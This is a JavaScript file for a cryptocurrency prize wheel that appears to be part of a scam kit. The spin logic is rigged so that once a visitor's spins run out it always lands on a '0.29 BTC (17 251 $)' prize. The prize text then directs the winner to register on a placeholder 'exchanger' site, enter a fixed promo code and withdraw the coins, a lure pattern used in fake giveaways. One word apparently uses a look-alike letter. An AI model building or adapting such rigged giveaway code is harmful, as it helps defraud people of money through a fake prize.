document.addEventListener("DOMContentLoaded", startWheel);

function startWheel () {
  var wheel = SPINWHEEL.create('SpinWheelCanvas', {
    width: document.getElementById('wheelCon').offsetWidth
  });
  const jsConfetti = new JSConfetti();

  (async function() {
    
    var prizes = {
      1: {
        name: 'TRX',
        icon: coinIcons.TRX,
        text: '50.000'
      },
      3: {
        name: 'BTC',
        icon: coinIcons.BTC,
        text: '0.2900',
        wonText: '0.29 BTC (17 251 $)',
        wonDescription: [
          'How you can collect your winnings?',
          '1️⃣Registеr an account on the exchanger https://SITE.com',
          '2️⃣Go to settings',
          '3️⃣Enter your code in «promo code» section',
          '4️⃣Withdraw BTC to your address',
          '5️⃣Done!'
        ],
        moreInfo: {
          promocode: '6DH3D87F',
          redirectUrl: 'https://google.com/'
        }
      },
      5: {
        name: 'TUSD',
        icon: coinIcons.TUSD,
        text: '25.000'
      },
      7: {
        name: 'ETH',
        icon: coinIcons.ETH,
        text: '0.1500'
      },
      9: {
        name: 'BTC',
        icon: coinIcons.BTC,
        text: '1.0000'
      },
      11: {
        name: 'SHIB',
        icon: coinIcons.SHIB,
        text: '100.00'
      },
      13: {
        name: 'TRX',
        icon: coinIcons.TRX,
        text: '1.0000'
      },
      15: {
        name: 'DOGE',
        icon: coinIcons.DOGE,
        text: '50.000'
      }
    };
  
    wheel.setPrizes(prizes);
  
    wheel.onWin = (onStartup) => {
      jsConfetti.addConfetti();
      if (onStartup) wheel.openPrize(3);
    };
    
    await wheel.build();
  
    wheel.onClickStart = () => {
      if (wheel.spinsStorage.maxSpins == 0) return wheel.runRandom();
      if (wheel.spinsStorage.balance == 0) wheel.runSelected(3);
      else wheel.runLose();
    };
  
    wheel.onClickCollectButton = () => {
      window.open(wheel.coin.moreInfo.redirectUrl, '_blank').focus();
    };
  })();
};